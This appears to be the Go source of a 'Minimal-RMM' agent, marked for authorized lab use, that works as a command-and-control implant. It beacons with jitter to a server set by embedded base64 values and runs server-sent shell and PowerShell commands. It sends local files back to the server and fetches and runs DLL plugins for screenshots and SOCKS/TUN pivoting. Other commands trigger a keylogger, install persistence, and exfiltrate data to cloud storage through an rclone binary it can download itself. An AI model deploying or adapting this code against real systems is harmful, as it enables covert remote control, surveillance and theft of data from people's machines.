// Minimal-RMM Go agent. Authorized lab use only.
//
// This agent deliberately uses the same polling protocol as client_rmm.ps1.
// It has no third-party dependencies so the server can produce reproducible
// cross-compiled binaries with CGO disabled.
package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

type config struct {
	BaseURL       string
	BeaconSecret  string
	SessionID     string
	HTTPProxy     string
	SleepSeconds  int
	JitterPercent int
	MaxRetries    int
}

type commandResponse struct {
	Command     string `json:"command"`
	Type        string `json:"type"`
	SocksActive bool   `json:"socks_active"`
	TunActive   bool   `json:"tun_active"`
}

type exfilJob struct {
	LocalPath      string            `json:"local_path"`
	Profile        string            `json:"profile"`
	Backend        string            `json:"backend"`
	Dest           string            `json:"dest"`
	RemoteName     string            `json:"remote_name"`
	LinkCommand    bool              `json:"link_command"`
	RcloneURL      string            `json:"rclone_url"`
	Env            map[string]string `json:"env"`
	EnvSkipObscure []string          `json:"env_skip_obscure"`
}

// These values are injected by the authenticated server build endpoint. They
// are encoded to keep linker arguments safe; environment variables override
// them at runtime.
var (
	defaultBaseURLB64       string
	defaultBeaconSecretB64  string
	defaultSessionIDB64     string
	defaultHTTPProxyB64     string
	defaultSleepSecondsB64  string
	defaultJitterPercentB64 string
	logMu                   sync.Mutex
	logFile                 *os.File
)

var pluginCommandPattern = regexp.MustCompile(`^[A-Za-z][A-Za-z0-9._-]{0,127}$`)

func main() {
	if len(os.Args) > 1 && os.Args[1] == "--plugin-child" {
		if err := runPluginChild(os.Args[1:]); err != nil {
			fmt.Fprintln(os.Stderr, err)
			os.Exit(3)
		}
		return
	}
	initAgentLog()
	cfg, err := loadConfig()
	if err != nil {
		logf("configuration error: %v", err)
		os.Exit(2)
	}
	logf("starting agent for %s", cfg.BaseURL)
	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
	client := newHTTPClient(cfg)
	socksPlugin := newPluginController("/tools/plugins/socks.dll")
	tunPlugin := newPluginController("/tools/plugins/tun.dll")
	defer socksPlugin.stop()
	defer tunPlugin.stop()

	for {
		if err := register(client, cfg); err != nil {
			if isSessionTerminatedError(err) {
				logf("session terminated by server")
				return
			}
			logf("register failed: %v", err)
			sleepWithJitter(cfg, rng)
			continue
		}
		if err := pollOnce(client, cfg, socksPlugin, tunPlugin); err != nil {
			if err.Error() == "session terminated by server" {
				return
			}
			logf("poll failed: %v", err)
		}
		sleepWithJitter(cfg, rng)
	}
}

// pluginController keeps one persistent pivot plugin outside the normal
// beacon command path. The server-side relay remains the source of truth for
// its lifetime; the child exits after that relay is stopped.
type pluginController struct {
	mu      sync.Mutex
	running bool
	cancel  context.CancelFunc
	done    chan struct{}
	path    string
}

func newPluginController(path string) *pluginController {
	return &pluginController{path: path}
}

func (p *pluginController) syncActive(active bool, client *http.Client, cfg *config) {
	if runtime.GOOS != "windows" || runtime.GOARCH != "amd64" {
		return
	}
	p.mu.Lock()
	if active {
		if p.running {
			p.mu.Unlock()
			return
		}
		ctx, cancel := context.WithCancel(context.Background())
		done := make(chan struct{})
		p.running = true
		p.cancel = cancel
		p.done = done
		p.mu.Unlock()
		go func() {
			defer close(done)
			input, _ := json.Marshal(map[string]string{
				"base_url":      cfg.BaseURL,
				"beacon_secret": cfg.BeaconSecret,
				"session_id":    cfg.SessionID,
				"http_proxy":    cfg.HTTPProxy,
			})
			_, _ = loadPluginPEContext(ctx, client, cfg, p.path, "Run", string(input))
			p.mu.Lock()
			if p.done == done {
				p.running = false
				p.cancel = nil
				p.done = nil
			}
			p.mu.Unlock()
		}()
		return
	}
	cancel := p.cancel
	p.mu.Unlock()
	if cancel != nil {
		cancel()
	}
}

func (p *pluginController) stop() {
	p.stopAndWait(5 * time.Second)
}

// stopAndWait cancels a persistent plugin and waits for its child runner to
// finish. The wait is bounded so a broken plugin cannot block agent shutdown.
func (p *pluginController) stopAndWait(timeout time.Duration) bool {
	p.mu.Lock()
	cancel := p.cancel
	done := p.done
	p.mu.Unlock()
	if cancel != nil {
		cancel()
	}
	if done == nil {
		return true
	}
	if timeout <= 0 {
		<-done
		return true
	}
	timer := time.NewTimer(timeout)
	defer timer.Stop()
	select {
	case <-done:
		return true
	case <-timer.C:
		return false
	}
}

func isSessionTerminatedError(err error) bool {
	return err != nil && strings.Contains(strings.ToUpper(err.Error()), "TERMINATED")
}

func isPermanentHTTPError(err error) bool {
	if err == nil {
		return false
	}
	message := err.Error()
	for _, status := range []string{"HTTP 400", "HTTP 401", "HTTP 403", "HTTP 404"} {
		if strings.HasPrefix(message, status) {
			return true
		}
	}
	return false
}

func loadConfig() (*config, error) {
	cfg := &config{
		BaseURL:       strings.TrimRight(envOr("RMM_BASE_URL", embeddedValue(defaultBaseURLB64)), "/"),
		BeaconSecret:  envOr("RMM_BEACON_SECRET", embeddedValue(defaultBeaconSecretB64)),
		SessionID:     envOr("RMM_SESSION_ID", embeddedValue(defaultSessionIDB64)),
		HTTPProxy:     strings.TrimSpace(envOr("RMM_HTTP_PROXY", embeddedValue(defaultHTTPProxyB64))),
		SleepSeconds:  envInt("RMM_SLEEP_SECONDS", envIntValue(defaultSleepSecondsB64, 60)),
		JitterPercent: envInt("RMM_JITTER_PERCENT", envIntValue(defaultJitterPercentB64, 30)),
		MaxRetries:    envInt("RMM_MAX_RETRIES", 3),
	}
	if cfg.BaseURL == "" || cfg.BeaconSecret == "" {
		return nil, errors.New("RMM_BASE_URL and RMM_BEACON_SECRET are required")
	}
	if cfg.SessionID == "" {
		// The server accepts only token-safe session IDs. Hostnames may contain
		// dots, so do not use the raw hostname as the identifier.
		cfg.SessionID = fmt.Sprintf("go-%d", time.Now().UnixNano())
	}
	if cfg.SleepSeconds < 1 {
		cfg.SleepSeconds = 1
	}
	if cfg.JitterPercent < 0 {
		cfg.JitterPercent = 0
	}
	if cfg.JitterPercent > 100 {
		cfg.JitterPercent = 100
	}
	return cfg, nil
}

func register(client *http.Client, cfg *config) error {
	v := values(cfg)
	v.Set("h", hostname())
	v.Set("u", username())
	v.Set("s", strconv.Itoa(cfg.SleepSeconds))
	v.Set("j", strconv.Itoa(cfg.JitterPercent))
	v.Set("sync", "1")
	v.Set("agent", "go")
	if runtime.GOOS == "windows" && runtime.GOARCH == "amd64" {
		v.Set("caps", "pe,rclone-plugin,socks-plugin,tun-plugin")
	} else {
		v.Set("caps", "")
	}
	_, err := request(client, cfg, http.MethodGet, "/register", v, nil)
	return err
}

func pollOnce(
	client *http.Client,
	cfg *config,
	socksPlugin *pluginController,
	tunPlugin *pluginController,
) error {
	data, err := request(client, cfg, http.MethodGet, "/cmd", values(cfg), nil)
	if err != nil {
		if isPermanentHTTPError(err) {
			socksPlugin.syncActive(false, client, cfg)
			tunPlugin.syncActive(false, client, cfg)
		}
		return err
	}
	var reply commandResponse
	if err := json.Unmarshal(data, &reply); err != nil {
		return err
	}
	socksPlugin.syncActive(reply.SocksActive, client, cfg)
	tunPlugin.syncActive(reply.TunActive, client, cfg)
	if strings.TrimSpace(reply.Command) == "" {
		_ = register(client, cfg)
		return nil
	}
	if strings.HasPrefix(strings.TrimSpace(reply.Command), "__DOWNLOAD__ ") {
		if err := sendFileDownload(client, cfg, strings.TrimSpace(strings.TrimPrefix(strings.TrimSpace(reply.Command), "__DOWNLOAD__ "))); err != nil {
			_ = sendTextResult(client, cfg, reply.Command, "Download failed: "+err.Error())
		}
		_ = register(client, cfg)
		return nil
	}
	if strings.TrimSpace(reply.Command) == "__EXIT__" {
		return errors.New("session terminated by server")
	}
	output, resultType := execute(reply.Command, cfg, client)
	query := values(cfg)
	query.Set("type", resultType)
	_, err = request(client, cfg, http.MethodPost, "/result", query, []byte(output))
	_ = register(client, cfg)
	return err
}

func newHTTPClient(cfg *config) *http.Client {
	transport := &http.Transport{}
	if cfg.HTTPProxy != "" {
		if proxyURL, err := url.Parse(cfg.HTTPProxy); err == nil && proxyURL.Scheme != "" && proxyURL.Host != "" {
			transport.Proxy = http.ProxyURL(proxyURL)
		}
	}
	return &http.Client{Timeout: 90 * time.Second, Transport: transport}
}

func execute(command string, cfg *config, client *http.Client) (string, string) {
	trimmed := strings.TrimSpace(command)
	if strings.HasPrefix(trimmed, "__CONFIG__ ") {
		parts := strings.Fields(trimmed)
		if len(parts) >= 2 {
			if n, err := strconv.Atoi(parts[1]); err == nil && n > 0 {
				cfg.SleepSeconds = n
			}
		}
		if len(parts) >= 3 {
			if n, err := strconv.Atoi(parts[2]); err == nil && n >= 0 && n <= 100 {
				cfg.JitterPercent = n
			}
		}
		return fmt.Sprintf("sleep=%d jitter=%d", cfg.SleepSeconds, cfg.JitterPercent), "config_ack"
	}
	if trimmed == "__STOP__" || trimmed == "__EXIT__" {
		return "Go agent does not terminate from a queued command; stop its process on the host.", "output"
	}
	if strings.HasPrefix(trimmed, "__DOWNLOAD__ ") {
		result, _ := downloadFile(strings.TrimSpace(strings.TrimPrefix(trimmed, "__DOWNLOAD__ ")))
		return result, "file_upload"
	}
	if strings.HasPrefix(trimmed, "__UPLOAD__ ") {
		result, _ := uploadFile(trimmed)
		return result, "output"
	}
	if strings.HasPrefix(trimmed, "__SCREENSHOT__") {
		result, err := loadPluginPE(client, cfg, "/tools/plugins/screenshot.dll", "Run", "")
		if err != nil {
			return "Screenshot failed: " + err.Error(), "output"
		}
		return result, "screenshot"
	}
	if strings.HasPrefix(trimmed, "__KEYLOG__ ") {
		result, resultType, err := keylogAction(strings.TrimSpace(strings.TrimPrefix(trimmed, "__KEYLOG__ ")))
		if err != nil {
			return "Keylogger failed: " + err.Error(), "output"
		}
		return result, resultType
	}
	if trimmed == "__INSTALL_PERSIST__" || trimmed == "__REMOVE_PERSIST__" {
		result, err := persistenceAction(trimmed == "__INSTALL_PERSIST__", cfg)
		if err != nil {
			return "Persistence failed: " + err.Error(), "output"
		}
		return result, "output"
	}
	if strings.HasPrefix(trimmed, "__EXFIL__") {
		result, err := exfiltrate(trimmed, cfg, client)
		if err != nil {
			return err.Error(), "output"
		}
		return result, "cloud_upload"
	}
	if strings.HasPrefix(trimmed, "__PE_LOAD__") || strings.HasPrefix(trimmed, "__PLUGIN_COMMAND__") {
		result, err := loadPluginCommand(client, cfg, trimmed)
		if err != nil {
			return "Plugin failed: " + err.Error(), "output"
		}
		return result, "output"
	}
	return runCommand(trimmed)
}

// loadPluginCommand parses the generic plugin commands. The plugin is fetched
// from the beacon server on demand and executed in a child process.
func loadPluginCommand(client *http.Client, cfg *config, command string) (string, error) {
	fields := strings.SplitN(strings.TrimSpace(command), " ", 4)
	if len(fields) < 2 || fields[1] == "" {
		return "", errors.New("plugin command requires a plugin name")
	}
	pluginToken := fields[1]
	exportName := "Run"
	input := ""
	if fields[0] == "__PLUGIN_COMMAND__" {
		if len(fields) < 3 || fields[2] == "" {
			return "", errors.New("__PLUGIN_COMMAND__ requires a command name")
		}
		if !pluginCommandPattern.MatchString(fields[2]) {
			return "", errors.New("invalid plugin command name")
		}
		if len(fields) > 3 {
			input = fields[3]
		}
		var err error
		input, err = pluginCommandEnvelope(fields[2], input)
		if err != nil {
			return "", err
		}
	} else {
		if len(fields) > 2 && fields[2] != "" {
			exportName = fields[2]
		}
		if len(fields) > 3 {
			input = fields[3]
		}
	}
	url := pluginToken
	if !strings.HasPrefix(pluginToken, "/") {
		url = "/tools/plugins/" + pluginToken
	}
	return loadPluginPE(client, cfg, url, exportName, input)
}

// pluginCommandEnvelope keeps command names out of the agent command parser.
// The plugin's Run export receives this JSON and owns subcommand dispatch.
func pluginCommandEnvelope(command, input string) (string, error) {
	payload, err := json.Marshal(map[string]string{
		"command": command,
		"input":   input,
	})
	if err != nil {
		return "", fmt.Errorf("encode plugin command: %w", err)
	}
	if len(payload) > 4096 {
		return "", errors.New("plugin command input is too large")
	}
	return string(payload), nil
}

func runCommand(command string) (string, string) {
	var name string
	var args []string
	switch {
	case strings.HasPrefix(command, "PS: ") || strings.HasPrefix(command, "powershell: "):
		if runtime.GOOS != "windows" {
			return "PowerShell is unavailable on this target.", "output"
		}
		name, args = "powershell.exe", []string{"-NoProfile", "-NonInteractive", "-Command", command[strings.Index(command, ":")+1:]}
	case strings.HasPrefix(command, "pwsh: "):
		name, args = "pwsh", []string{"-NoProfile", "-NonInteractive", "-Command", command[6:]}
	default:
		if runtime.GOOS == "windows" {
			name, args = "cmd.exe", []string{"/d", "/c", command}
		} else {
			name, args = "/bin/sh", []string{"-c", command}
		}
	}
	out, err := newCommand(name, args...).CombinedOutput()
	if err != nil {
		return string(out) + "\n" + err.Error(), "output"
	}
	return string(out), "output"
}

func downloadFile(path string) (string, string) {
	data, err := os.ReadFile(path)
	if err != nil {
		return err.Error(), "output"
	}
	payload, _ := json.Marshal(map[string]any{
		"filename": filepath.Base(path), "remote_path": path,
		"content": base64.StdEncoding.EncodeToString(data), "eof": true,
	})
	return string(payload), "file_upload"
}

func sendFileDownload(client *http.Client, cfg *config, path string) error {
	file, err := os.Open(path)
	if err != nil {
		return err
	}
	defer file.Close()
	info, err := file.Stat()
	if err != nil {
		return err
	}
	if info.IsDir() {
		return errors.New("path is a directory")
	}
	uploadID := fmt.Sprintf("%d-%d", time.Now().UnixNano(), os.Getpid())
	const chunkSize = 2 * 1024 * 1024
	var offset int64
	for {
		chunk := make([]byte, chunkSize)
		n, readErr := file.Read(chunk)
		if readErr != nil && !errors.Is(readErr, io.EOF) {
			return readErr
		}
		eof := offset+int64(n) >= info.Size()
		if info.Size() == 0 {
			eof = true
		}
		payload, _ := json.Marshal(map[string]any{
			"filename": filepath.Base(path), "remote_path": path,
			"upload_id": uploadID, "offset": offset, "eof": eof,
			"content": base64.StdEncoding.EncodeToString(chunk[:n]),
		})
		query := values(cfg)
		query.Set("type", "file_upload")
		if _, err := request(client, cfg, http.MethodPost, "/result", query, payload); err != nil {
			return err
		}
		offset += int64(n)
		if eof || readErr == io.EOF {
			return nil
		}
	}
}

func sendTextResult(client *http.Client, cfg *config, command, output string) error {
	payload, _ := json.Marshal(map[string]string{"rmm_cmd": command, "rmm_output": output})
	return func() error {
		_, err := request(client, cfg, http.MethodPost, "/result", values(cfg), payload)
		return err
	}()
}

func uploadFile(command string) (string, string) {
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 {
		return "invalid __UPLOAD__ payload", "output"
	}
	path := strings.TrimSpace(strings.TrimPrefix(parts[0], "__UPLOAD__ "))
	var payload struct {
		Content     string `json:"content"`
		Filename    string `json:"filename"`
		SrcFilename string `json:"src_filename"`
	}
	if err := json.Unmarshal([]byte(parts[1]), &payload); err != nil {
		return err.Error(), "output"
	}
	data, err := base64.StdEncoding.DecodeString(payload.Content)
	if err != nil {
		return err.Error(), "output"
	}
	if strings.HasSuffix(path, string(os.PathSeparator)) || strings.HasSuffix(path, "/") || strings.HasSuffix(path, "\\") {
		name := payload.SrcFilename
		if name == "" {
			name = payload.Filename
		}
		if name == "" {
			return "destination directory has no filename", "output"
		}
		path = filepath.Join(strings.TrimRight(path, `/\`), filepath.Base(name))
	}
	if info, statErr := os.Stat(path); statErr == nil && info.IsDir() {
		name := payload.SrcFilename
		if name == "" {
			name = payload.Filename
		}
		if name == "" {
			return "destination directory has no filename", "output"
		}
		path = filepath.Join(path, filepath.Base(name))
	}
	if parent := filepath.Dir(path); parent != "." {
		if err := os.MkdirAll(parent, 0700); err != nil {
			return err.Error(), "output"
		}
	}
	if err := os.WriteFile(path, data, 0600); err != nil {
		return err.Error(), "output"
	}
	return "uploaded " + path, "output"
}

func exfiltrate(command string, cfg *config, client *http.Client) (string, error) {
	parts := strings.SplitN(command, "\n", 2)
	if len(parts) != 2 {
		return "", errors.New("Exfil failed: missing JSON payload")
	}
	var job exfilJob
	if err := json.Unmarshal([]byte(parts[1]), &job); err != nil {
		return "", fmt.Errorf("Exfil failed: %w", err)
	}
	info, err := os.Stat(job.LocalPath)
	if err != nil {
		return cloudUploadResult(job, false, 0, err.Error()), nil
	}
	rclone, err := exec.LookPath("rclone")
	if err != nil {
		rclone, err = downloadRclone(client, cfg, job.RcloneURL)
		if err != nil {
			return cloudUploadResult(job, false, info.Size(), err.Error()), nil
		}
	}
	if job.RemoteName == "" {
		job.RemoteName = "RMM"
	}
	target := job.RemoteName + ":" + job.Dest
	mode := "copyto"
	if info.IsDir() {
		mode = "copy"
	}
	args := []string{mode, job.LocalPath, target}
	if runtime.GOOS == "windows" {
		args = append(args, "--config", "NUL")
	}
	env := os.Environ()
	skipObscure := make(map[string]struct{}, len(job.EnvSkipObscure))
	for _, key := range job.EnvSkipObscure {
		skipObscure[key] = struct{}{}
	}
	for key, value := range job.Env {
		if strings.HasSuffix(strings.ToUpper(key), "_PASS") {
			if _, skip := skipObscure[key]; !skip {
				value, err = obscureRcloneValue(rclone, value)
				if err != nil {
					return cloudUploadResult(job, false, info.Size(), err.Error()), nil
				}
			}
		}
		env = append(env, key+"="+value)
	}
	cmd := newCommand(rclone, args...)
	cmd.Env = env
	output, runErr := cmd.CombinedOutput()
	if runErr != nil {
		return cloudUploadResult(job, false, info.Size(), strings.TrimSpace(string(output))), nil
	}
	link := ""
	if job.LinkCommand && !info.IsDir() {
		linkArgs := []string{"link", target}
		if runtime.GOOS == "windows" {
			linkArgs = append(linkArgs, "--config", "NUL")
		}
		linkCmd := newCommand(rclone, linkArgs...)
		linkCmd.Env = env
		if linkOut, linkErr := linkCmd.CombinedOutput(); linkErr == nil {
			link = strings.TrimSpace(string(linkOut))
		}
	}
	return cloudUploadResultWithLink(job, true, info.Size(), "", link), nil
}

func obscureRcloneValue(rclone, value string) (string, error) {
	output, err := newCommand(rclone, "obscure", value).CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("rclone obscure failed: %s", strings.TrimSpace(string(output)))
	}
	obscured := strings.TrimSpace(string(output))
	if obscured == "" {
		return "", errors.New("rclone obscure returned an empty value")
	}
	return obscured, nil
}

func downloadRclone(client *http.Client, cfg *config, relativeURL string) (string, error) {
	if relativeURL == "" {
		relativeURL = "/tools/rclone.exe"
	}
	data, err := request(client, cfg, http.MethodGet, relativeURL, values(cfg), nil)
	if err != nil {
		return "", fmt.Errorf("rclone bootstrap failed: %w", err)
	}
	name := "minimal-rmm-rclone"
	if runtime.GOOS == "windows" {
		name += ".exe"
	}
	path := filepath.Join(os.TempDir(), name)
	if err := os.WriteFile(path, data, 0700); err != nil {
		return "", fmt.Errorf("rclone bootstrap write failed: %w", err)
	}
	if runtime.GOOS != "windows" {
		if err := os.Chmod(path, 0700); err != nil {
			return "", fmt.Errorf("rclone bootstrap permissions failed: %w", err)
		}
	}
	return path, nil
}

func cloudUploadResult(job exfilJob, success bool, size int64, failure string) string {
	return cloudUploadResultWithLink(job, success, size, failure, "")
}

func cloudUploadResultWithLink(job exfilJob, success bool, size int64, failure, link string) string {
	payload := map[string]any{"remote_path": job.LocalPath, "profile": job.Profile, "backend": job.Backend, "success": success, "link": link, "dest": job.Dest, "size": size, "error": failure}
	data, _ := json.Marshal(payload)
	return string(data)
}

func request(client *http.Client, cfg *config, method, endpoint string, query url.Values, body []byte) ([]byte, error) {
	return requestContext(context.Background(), client, cfg, method, endpoint, query, body)
}

// requestContext performs one authenticated beacon request and lets a
// persistent plugin cancel an in-flight artifact download during shutdown.
func requestContext(ctx context.Context, client *http.Client, cfg *config, method, endpoint string, query url.Values, body []byte) ([]byte, error) {
	u := cfg.BaseURL + endpoint + "?" + query.Encode()
	var reader io.Reader
	if body != nil {
		reader = bytes.NewReader(body)
	}
	if ctx == nil {
		ctx = context.Background()
	}
	req, err := http.NewRequestWithContext(ctx, method, u, reader)
	if err != nil {
		return nil, err
	}
	req.Header.Set("X-RMM-Beacon-Token", cfg.BeaconSecret)
	if body != nil {
		contentType := "text/plain; charset=utf-8"
		if endpoint == "/socks" || query.Get("type") == "file_upload" || query.Get("type") == "output" {
			contentType = "application/json; charset=utf-8"
		}
		req.Header.Set("Content-Type", contentType)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	data, readErr := io.ReadAll(resp.Body)
	if readErr != nil {
		return nil, readErr
	}
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("HTTP %d: %s", resp.StatusCode, strings.TrimSpace(string(data)))
	}
	return data, nil
}

func values(cfg *config) url.Values { v := url.Values{}; v.Set("id", cfg.SessionID); return v }
func hostname() string {
	h, _ := os.Hostname()
	if h == "" {
		return "unknown"
	}
	return h
}
func username() string {
	if u := os.Getenv("USERNAME"); u != "" {
		return u
	}
	if u := os.Getenv("USER"); u != "" {
		return u
	}
	return "unknown"
}
func envOr(name, fallback string) string {
	if v := os.Getenv(name); v != "" {
		return v
	}
	return fallback
}
func envInt(name string, fallback int) int {
	n, err := strconv.Atoi(os.Getenv(name))
	if err != nil {
		return fallback
	}
	return n
}
func embeddedValue(value string) string {
	if value == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(value)
	if err != nil {
		return ""
	}
	return string(decoded)
}
func envIntValue(value string, fallback int) int {
	return envIntValueString(embeddedValue(value), fallback)
}
func envIntValueString(value string, fallback int) int {
	n, err := strconv.Atoi(value)
	if err != nil {
		return fallback
	}
	return n
}
func sleepWithJitter(cfg *config, rng *rand.Rand) {
	delay := cfg.SleepSeconds
	if cfg.JitterPercent > 0 {
		delta := delay * cfg.JitterPercent / 100
		delay += rng.Intn(2*delta+1) - delta
		if delay < 1 {
			delay = 1
		}
	}
	time.Sleep(time.Duration(delay) * time.Second)
}
func logf(format string, args ...any) {
	line := fmt.Sprintf("[minimal-rmm-go] "+format+"\n", args...)
	_, _ = fmt.Fprint(os.Stderr, line)
	logMu.Lock()
	defer logMu.Unlock()
	if logFile != nil {
		_, _ = logFile.WriteString(line)
		_ = logFile.Sync()
	}
}

func initAgentLog() {
	path := envOr("RMM_LOG_FILE", filepath.Join(os.TempDir(), "minimal-rmm-agent.log"))
	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
	if err == nil {
		logFile = file
	}
}
